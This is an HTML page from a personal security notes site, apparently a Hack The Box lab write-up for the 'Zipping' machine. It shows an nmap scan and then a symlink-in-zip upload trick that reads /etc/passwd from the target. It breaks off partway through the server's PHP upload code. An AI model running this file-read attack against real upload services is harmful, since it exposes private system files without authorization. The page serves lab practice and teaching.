@@ -1,0 +1,878 @@
+<!doctype html>
+<html class="no-js" lang="en" data-content_root="">
+  <head><meta charset="utf-8"/>
+    <meta name="viewport" content="width=device-width,initial-scale=1"/>
+    <meta name="color-scheme" content="light dark"><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-2TCTE0JE23"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'G-2TCTE0JE23');
+    </script>
+        <link href="../../../../_static/lazer_fox.png" sizes="300x300" rel="icon" type="image/png"><link rel="index" title="Index" href="../../../../genindex.html" /><link rel="search" title="Search" href="../../../../search.html" /><link rel="next" title="Easy" href="../../easy/easy.html" /><link rel="prev" title="Updown" href="../updown/updown.html" />
+
+    <!-- Generated with Sphinx 7.1.2 and Furo 2023.08.19 -->
+        <title>Zipping - blnkn&#39;s notes</title>
+      <link rel="stylesheet" type="text/css" href="../../../../_static/pygments.css?v=a746c00c" />
+    <link rel="stylesheet" type="text/css" href="../../../../_static/styles/furo.css?v=135e06be" />
+    <link rel="stylesheet" type="text/css" href="../../../../_static/styles/furo-extensions.css?v=36a5483c" />
+    
+    
+
+
+<style>
+  body {
+    --color-code-background: #f8f8f8;
+  --color-code-foreground: black;
+  
+  }
+  @media not print {
+    body[data-theme="dark"] {
+      --color-code-background: #202020;
+  --color-code-foreground: #d0d0d0;
+  
+    }
+    @media (prefers-color-scheme: dark) {
+      body:not([data-theme="light"]) {
+        --color-code-background: #202020;
+  --color-code-foreground: #d0d0d0;
+  
+      }
+    }
+  }
+</style></head>
+  <body>
+    
+    <script>
+      document.body.dataset.theme = localStorage.getItem("theme") || "auto";
+    </script>
+    
+
+<svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
+  <symbol id="svg-toc" viewBox="0 0 24 24">
+    <title>Contents</title>
+    <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024">
+      <path d="M408 442h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8zm-8 204c0 4.4 3.6 8 8 8h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56zm504-486H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zm0 632H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zM115.4 518.9L271.7 642c5.8 4.6 14.4.5 14.4-6.9V388.9c0-7.4-8.5-11.5-14.4-6.9L115.4 505.1a8.74 8.74 0 0 0 0 13.8z"/>
+    </svg>
+  </symbol>
+  <symbol id="svg-menu" viewBox="0 0 24 24">
+    <title>Menu</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather-menu">
+      <line x1="3" y1="12" x2="21" y2="12"></line>
+      <line x1="3" y1="6" x2="21" y2="6"></line>
+      <line x1="3" y1="18" x2="21" y2="18"></line>
+    </svg>
+  </symbol>
+  <symbol id="svg-arrow-right" viewBox="0 0 24 24">
+    <title>Expand</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather-chevron-right">
+      <polyline points="9 18 15 12 9 6"></polyline>
+    </svg>
+  </symbol>
+  <symbol id="svg-sun" viewBox="0 0 24 24">
+    <title>Light mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="feather-sun">
+      <circle cx="12" cy="12" r="5"></circle>
+      <line x1="12" y1="1" x2="12" y2="3"></line>
+      <line x1="12" y1="21" x2="12" y2="23"></line>
+      <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+      <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+      <line x1="1" y1="12" x2="3" y2="12"></line>
+      <line x1="21" y1="12" x2="23" y2="12"></line>
+      <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+      <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+    </svg>
+  </symbol>
+  <symbol id="svg-moon" viewBox="0 0 24 24">
+    <title>Dark mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="icon-tabler-moon">
+      <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+      <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z" />
+    </svg>
+  </symbol>
+  <symbol id="svg-sun-half" viewBox="0 0 24 24">
+    <title>Auto light/dark mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="icon-tabler-shadow">
+      <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+      <circle cx="12" cy="12" r="9" />
+      <path d="M13 12h5" />
+      <path d="M13 15h4" />
+      <path d="M13 18h1" />
+      <path d="M13 9h4" />
+      <path d="M13 6h1" />
+    </svg>
+  </symbol>
+</svg>
+
+<input type="checkbox" class="sidebar-toggle" name="__navigation" id="__navigation">
+<input type="checkbox" class="sidebar-toggle" name="__toc" id="__toc">
+<label class="overlay sidebar-overlay" for="__navigation">
+  <div class="visually-hidden">Hide navigation sidebar</div>
+</label>
+<label class="overlay toc-overlay" for="__toc">
+  <div class="visually-hidden">Hide table of contents sidebar</div>
+</label>
+
+
+
+<div class="page">
+  <header class="mobile-header">
+    <div class="header-left">
+      <label class="nav-overlay-icon" for="__navigation">
+        <div class="visually-hidden">Toggle site navigation sidebar</div>
+        <i class="icon"><svg><use href="#svg-menu"></use></svg></i>
+      </label>
+    </div>
+    <div class="header-center">
+      <a href="../../../../index.html"><div class="brand">blnkn's notes</div></a>
+    </div>
+    <div class="header-right">
+      <div class="theme-toggle-container theme-toggle-header">
+        <button class="theme-toggle">
+          <div class="visually-hidden">Toggle Light / Dark / Auto color theme</div>
+          <svg class="theme-icon-when-auto"><use href="#svg-sun-half"></use></svg>
+          <svg class="theme-icon-when-dark"><use href="#svg-moon"></use></svg>
+          <svg class="theme-icon-when-light"><use href="#svg-sun"></use></svg>
+        </button>
+      </div>
+      <label class="toc-overlay-icon toc-header-icon" for="__toc">
+        <div class="visually-hidden">Toggle table of contents sidebar</div>
+        <i class="icon"><svg><use href="#svg-toc"></use></svg></i>
+      </label>
+    </div>
+  </header>
+  <aside class="sidebar-drawer">
+    <div class="sidebar-container">
+      
+      <div class="sidebar-sticky"><a class="sidebar-brand" href="../../../../index.html">
+  
+  <div class="sidebar-logo-container">
+    <img class="sidebar-logo" src="../../../../_static/lazer_fox.png" alt="Logo"/>
+  </div>
+  
+  <span class="sidebar-brand-text">blnkn's notes</span>
+  
+</a><form class="sidebar-search-container" method="get" action="../../../../search.html" role="search">
+  <input class="sidebar-search" placeholder="Search" name="q" aria-label="Search">
+  <input type="hidden" name="check_keywords" value="yes">
+  <input type="hidden" name="area" value="default">
+</form>
+<div id="searchbox"></div><div class="sidebar-scroll"><div class="sidebar-tree">
+  <p class="caption" role="heading"><span class="caption-text">Contents:</span></p>
+<ul class="current">
+<li class="toctree-l1 current has-children"><a class="reference internal" href="../../../htb.html">Hack The Box</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-1" name="toctree-checkbox-1" role="switch" type="checkbox"/><label for="toctree-checkbox-1"><div class="visually-hidden">Toggle navigation of Hack The Box</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
+<li class="toctree-l2 has-children"><a class="reference internal" href="../../../academy/academy.html">Academy</a><input class="toctree-checkbox" id="toctree-checkbox-2" name="toctree-checkbox-2" role="switch" type="checkbox"/><label for="toctree-checkbox-2"><div class="visually-hidden">Toggle navigation of Academy</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/active-directory/active-directory.html">Active Directory</a><input class="toctree-checkbox" id="toctree-checkbox-3" name="toctree-checkbox-3" role="switch" type="checkbox"/><label for="toctree-checkbox-3"><div class="visually-hidden">Toggle navigation of Active Directory</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/ad/ad.html">Active Directory</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/ad/ad.html#user-account-control-values">User Account Control Values</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/kerberos/kerberos.html">Kerberos</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/windows-auth/windows-auth.html">Windows Authentication</a></li>
+</ul>
+</li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/buffer-overflows/buffer-overflows.html">Buffer Overflows</a><input class="toctree-checkbox" id="toctree-checkbox-4" name="toctree-checkbox-4" role="switch" type="checkbox"/><label for="toctree-checkbox-4"><div class="visually-hidden">Toggle navigation of Buffer Overflows</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/buffer-overflows/linux-buffer-overflows/linux-buffer-overflows.html">Linux Buffer Overflows</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../../../academy/hashcat/hashcat.html">Hashcat</a></li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/os-fundamentals/os-fundamentals.html">OS Fundamentals</a><input class="toctree-checkbox" id="toctree-checkbox-5" name="toctree-checkbox-5" role="switch" type="checkbox"/><label for="toctree-checkbox-5"><div class="visually-hidden">Toggle navigation of OS Fundamentals</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/os-fundamentals/windows-fundamentals/windows-fundamentals.html">Windows OS Fundamentals</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../../../academy/sqli/sqli.html">SQLi</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../academy/webapp/webapp.html">Web Apps</a></li>
+</ul>
+</li>
+<li class="toctree-l2 current has-children"><a class="reference internal" href="../../machines.html">Lab Machines</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-6" name="toctree-checkbox-6" role="switch" type="checkbox"/><label for="toctree-checkbox-6"><div class="visually-hidden">Toggle navigation of Lab Machines</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../hard/hard.html">Hard</a><input class="toctree-checkbox" id="toctree-checkbox-7" name="toctree-checkbox-7" role="switch" type="checkbox"/><label for="toctree-checkbox-7"><div class="visually-hidden">Toggle navigation of Hard</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../hard/snoopy/snoopy.html">Snoopy</a></li>
+</ul>
+</li>
+<li class="toctree-l3 current has-children"><a class="reference internal" href="../medium.html">Medium</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-8" name="toctree-checkbox-8" role="switch" type="checkbox"/><label for="toctree-checkbox-8"><div class="visually-hidden">Toggle navigation of Medium</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
+<li class="toctree-l4"><a class="reference internal" href="../ambassador/ambassador.html">Ambassador</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../authority/authority.html">Authority</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../awkward/awkward.html">Awkward</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../faculty/faculty.html">Faculty</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../forgot/forgot.html">Forgot</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../format/format.html">Format</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../health/health.html">Health</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../jupiter/jupiter.html">Jupiter</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../manager/manager.html">Manager</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../mentor/mentor.html">Mentor</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../only4you/only4you.html">Only4you</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../outdated/outdated.html">Outdated</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../sandworm/sandworm.html">Sandworm</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../scrambled/scrambled.html">Scrambled</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../shared/shared.html">Shared</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../updown/updown.html">Updown</a></li>
+<li class="toctree-l4 current current-page"><a class="current reference internal" href="#">Zipping</a></li>
+</ul>
+</li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../easy/easy.html">Easy</a><input class="toctree-checkbox" id="toctree-checkbox-9" name="toctree-checkbox-9" role="switch" type="checkbox"/><label for="toctree-checkbox-9"><div class="visually-hidden">Toggle navigation of Easy</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/analytics/analytics.html">Analytics</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/busqueda/busqueda.html">Busqueda</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/codify/codify.html">Codify</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/inject/inject.html">Inject</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/keeper/keeper.html">Keeper</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/metatwo/metatwo.html">Meta two</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/monitorstwo/monitorstwo.html">Monitors two</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/pc/pc.html">Pc</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/photobomb/photobomb.html">Photobomb</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/pilgrimage/pilgrimage.html">Pilgrimage</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/precious/precious.html">Precious</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/red_panda/red_panda.html">Red panda</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/sau/sau.html">Sau</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/shoppy/shoppy.html">Shoppy</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/soccer/soccer.html">Soccer</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/stocker/stocker.html">Stocker</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/support/support.html">Support</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/topology/topology.html">Topology</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/trick/trick.html">Trick</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../pg/pg.html">Proving Grounds</a><input class="toctree-checkbox" id="toctree-checkbox-10" name="toctree-checkbox-10" role="switch" type="checkbox"/><label for="toctree-checkbox-10"><div class="visually-hidden">Toggle navigation of Proving Grounds</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l2"><a class="reference internal" href="../../../../pg/ha_natraj/ha_natraj.html">Ha Natraj</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../pg/sunset_decoy/sunset_decoy.html">Sunset Decoy</a></li>
+</ul>
+</li>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../dvwa/dvwa.html">DVWA</a><input class="toctree-checkbox" id="toctree-checkbox-11" name="toctree-checkbox-11" role="switch" type="checkbox"/><label for="toctree-checkbox-11"><div class="visually-hidden">Toggle navigation of DVWA</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l2"><a class="reference internal" href="../../../../dvwa/sqli_blind/sqli_blind.html">Blind SQLi</a></li>
+</ul>
+</li>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../other/other.html">Other</a><input class="toctree-checkbox" id="toctree-checkbox-12" name="toctree-checkbox-12" role="switch" type="checkbox"/><label for="toctree-checkbox-12"><div class="visually-hidden">Toggle navigation of Other</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/assembly/assembly.html">Assembly</a></li>
+<li class="toctree-l2 has-children"><a class="reference internal" href="../../../../other/aws-ccp/aws-ccp.html">AWS-CCP</a><input class="toctree-checkbox" id="toctree-checkbox-13" name="toctree-checkbox-13" role="switch" type="checkbox"/><label for="toctree-checkbox-13"><div class="visually-hidden">Toggle navigation of AWS-CCP</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/1-foundations-of-cloud-computing.html">Foundations of Cloud Computing</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/2-technology.html">Technologies</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/3-security-and-compliance.html">Security and Compliance</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/4-pricing-billing-and-governance.html">Pricing Billing and Governance</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/codebashing/codebashing.html">Codebashing</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/dba/dba.html">Database Administration</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/dorking/dorking.html">Google dork cheatsheet</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/empire/empire.html">Empire</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/hashes/hashes.html">Hashes</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/irssi/irssi.html">Irssi</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/metasploit/metasploit.html">Metasploit framework</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/nmap/nmap.html">Nmap</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/reconstructing-private-key/reconstructing-private-key.html">Reconstructing a Private Key</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/rfid/rfid.html">RFID</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/server-hardening/server-hardening.html">Server Hardening</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/shells/shells.html">Reverse Shells</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/stego/stego.html">Steganography</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/tcpdump-vuln/tcpdump-vuln.html">TCPdump</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/wordlists/wordlists.html">Making Custom Wordlists</a></li>
+<li class="toctree-l2 has-children"><a class="reference internal" href="../../../../other/c/c.html">C</a><input class="toctree-checkbox" id="toctree-checkbox-14" name="toctree-checkbox-14" role="switch" type="checkbox"/><label for="toctree-checkbox-14"><div class="visually-hidden">Toggle navigation of C</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/c/execution-methods.html">C Execution methods</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/air-ungap/air-ungap.html">Air-Ungap</a></li>
+</ul>
+</li>
+</ul>
+
+</div>
+</div>
+
+      </div>
+      
+    </div>
+  </aside>
+  <div class="main">
+    <div class="content">
+      <div class="article-container">
+        <a href="#" class="back-to-top muted-link">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12z"></path>
+          </svg>
+          <span>Back to top</span>
+        </a>
+        <div class="content-icon-container">
+          
+<div class="theme-toggle-container theme-toggle-content">
+            <button class="theme-toggle">
+              <div class="visually-hidden">Toggle Light / Dark / Auto color theme</div>
+              <svg class="theme-icon-when-auto"><use href="#svg-sun-half"></use></svg>
+              <svg class="theme-icon-when-dark"><use href="#svg-moon"></use></svg>
+              <svg class="theme-icon-when-light"><use href="#svg-sun"></use></svg>
+            </button>
+          </div>
+          <label class="toc-overlay-icon toc-content-icon" for="__toc">
+            <div class="visually-hidden">Toggle table of contents sidebar</div>
+            <i class="icon"><svg><use href="#svg-toc"></use></svg></i>
+          </label>
+        </div>
+        <article role="main">
+          <p><img alt="zipping.png" src="../../../../_images/zipping.png" /></p>
+<section id="zipping">
+<h1>Zipping<a class="headerlink" href="#zipping" title="Permalink to this heading">#</a></h1>
+<section id="enum">
+<h2>Enum<a class="headerlink" href="#enum" title="Permalink to this heading">#</a></h2>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>-Pn<span class="w"> </span><span class="m">10</span>.10.11.229<span class="w"> </span>-oN<span class="w"> </span>scans/nmap.initial
+Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.94<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2023</span>-10-29<span class="w"> </span><span class="m">16</span>:11<span class="w"> </span>GMT
+Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">10</span>.10.11.229
+Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.027s<span class="w"> </span>latency<span class="o">)</span>.
+Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">840</span><span class="w"> </span>closed<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>conn-refused<span class="o">)</span>,<span class="w"> </span><span class="m">158</span><span class="w"> </span>filtered<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>no-response<span class="o">)</span>
+PORT<span class="w">   </span>STATE<span class="w"> </span>SERVICE<span class="w"> </span>VERSION
+<span class="m">22</span>/tcp<span class="w"> </span>open<span class="w">  </span>ssh<span class="w">     </span>OpenSSH<span class="w"> </span><span class="m">9</span>.0p1<span class="w"> </span>Ubuntu<span class="w"> </span>1ubuntu7.3<span class="w"> </span><span class="o">(</span>Ubuntu<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>protocol<span class="w"> </span><span class="m">2</span>.0<span class="o">)</span>
+<span class="p">|</span><span class="w"> </span>ssh-hostkey:
+<span class="p">|</span><span class="w">   </span><span class="m">256</span><span class="w"> </span>9d:6e:ec:02:2d:0f:6a:38:60:c6:aa:ac:1e:e0:c2:84<span class="w"> </span><span class="o">(</span>ECDSA<span class="o">)</span>
+<span class="p">|</span>_<span class="w">  </span><span class="m">256</span><span class="w"> </span>eb:95:11:c7:a6:fa:ad:74:ab:a2:c5:f6:a4:02:18:41<span class="w"> </span><span class="o">(</span>ED25519<span class="o">)</span>
+<span class="m">80</span>/tcp<span class="w"> </span>open<span class="w">  </span>http<span class="w">    </span>Apache<span class="w"> </span>httpd<span class="w"> </span><span class="m">2</span>.4.54<span class="w"> </span><span class="o">((</span>Ubuntu<span class="o">))</span>
+<span class="p">|</span>_http-server-header:<span class="w"> </span>Apache/2.4.54<span class="w"> </span><span class="o">(</span>Ubuntu<span class="o">)</span>
+<span class="p">|</span>_http-title:<span class="w"> </span>Zipping<span class="w"> </span><span class="p">|</span><span class="w"> </span>Watch<span class="w"> </span>store
+Service<span class="w"> </span>Info:<span class="w"> </span>OS:<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:linux:linux_kernel
+
+Service<span class="w"> </span>detection<span class="w"> </span>performed.<span class="w"> </span>Please<span class="w"> </span>report<span class="w"> </span>any<span class="w"> </span>incorrect<span class="w"> </span>results<span class="w"> </span>at<span class="w"> </span>https://nmap.org/submit/<span class="w"> </span>.
+Nmap<span class="w"> </span><span class="k">done</span>:<span class="w"> </span><span class="m">1</span><span class="w"> </span>IP<span class="w"> </span>address<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>host<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">13</span>.85<span class="w"> </span>seconds
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>-I<span class="w"> </span>http://10.10.11.229
+HTTP/1.1<span class="w"> </span><span class="m">200</span><span class="w"> </span>OK
+Date:<span class="w"> </span>Sun,<span class="w"> </span><span class="m">29</span><span class="w"> </span>Oct<span class="w"> </span><span class="m">2023</span><span class="w"> </span><span class="m">16</span>:13:52<span class="w"> </span>GMT
+Server:<span class="w"> </span>Apache/2.4.54<span class="w"> </span><span class="o">(</span>Ubuntu<span class="o">)</span>
+Content-Type:<span class="w"> </span>text/html<span class="p">;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>UTF-8
+</pre></div>
+</div>
+<p>There’s an upload page which does only accept zip files with one pdf in it.</p>
+</section>
+<section id="arbitrary-file-read">
+<h2>Arbitrary file read<a class="headerlink" href="#arbitrary-file-read" title="Permalink to this heading">#</a></h2>
+<p>Setup a file.pdf that is a symlink to /etc/passwd</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>ln<span class="w"> </span>-s<span class="w"> </span>/etc/passwd<span class="w"> </span>file.pdf
+ls<span class="w"> </span>-la<span class="w"> </span>file.pdf
+lrwxrwxrwx<span class="w"> </span><span class="m">1</span><span class="w"> </span>blnkn<span class="w"> </span>blnkn<span class="w"> </span><span class="m">11</span><span class="w"> </span>Oct<span class="w"> </span><span class="m">29</span><span class="w"> </span><span class="m">17</span>:06<span class="w"> </span>file.pdf<span class="w"> </span>-&gt;<span class="w"> </span>/etc/passwd
+</pre></div>
+</div>
+<p>Zip it, with the symlink as such instead of compressing and storing the file referred to by the link</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>zip<span class="w"> </span>--symlink<span class="w"> </span>-r<span class="w"> </span>file<span class="w"> </span>file.pdf
+ls<span class="w"> </span>-la<span class="w"> </span>file.zip
+-rw-r--r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>blnkn<span class="w"> </span>blnkn<span class="w"> </span><span class="m">839</span><span class="w"> </span>Oct<span class="w"> </span><span class="m">29</span><span class="w"> </span><span class="m">17</span>:07<span class="w"> </span>file.zip
+</pre></div>
+</div>
+<p>Upload and curl the result</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>-s<span class="w"> </span>http://10.10.11.229/uploads/642147a874e4dbb4959086f0e6a9188d/file.pdf<span class="w"> </span><span class="p">|</span>grep<span class="w"> </span>sh$
+root:x:0:0:root:/root:/bin/bash
+rektsu:x:1001:1001::/home/rektsu:/bin/bash
+</pre></div>
+</div>
+</section>
+<section id="automating-the-process">
+<h2>Automating the process<a class="headerlink" href="#automating-the-process" title="Permalink to this heading">#</a></h2>
+<p>This is how the upload feature works</p>
+<div class="highlight-php notranslate"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span> <span class="p">{</span>
+  <span class="c1">// Get the uploaded zip file</span>
+  <span class="nv">$zipFile</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;zipFile&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">];</span>
+  <span class="k">if</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&quot;zipFile&quot;</span><span class="p">][</span><span class="s2">&quot;size&quot;</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">300000</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">echo</span> <span class="s2">&quot;&lt;p&gt;File size must be less than 300,000 bytes.&lt;/p&gt;&quot;</span><span class="p">;</span>
+  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="c1">// Create an md5 hash of the zip file                                                                                                                                                             $fileHash = md5_file($zipFile);</span>
+    <span class="c1">// Create a new directory for the extracted files</span>
+    <span class="nv">$uploadDir</span> <span class="o">=</span> <span class="s2">&quot;uploads/</span><span class="si">$fileHash</span><span class="s2">/&quot;</span><span class="p">;</span>
+    <span class="nv">$tmpDir</span> <span class="o">=</span> <span class="nb">sys_get_temp_dir</span><span class="p">();</span>
+    <span class="c1">// Extract the files from the zip</span>
+    <span class="nv">$zip</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ZipArchive</span><span class="p">;</span>
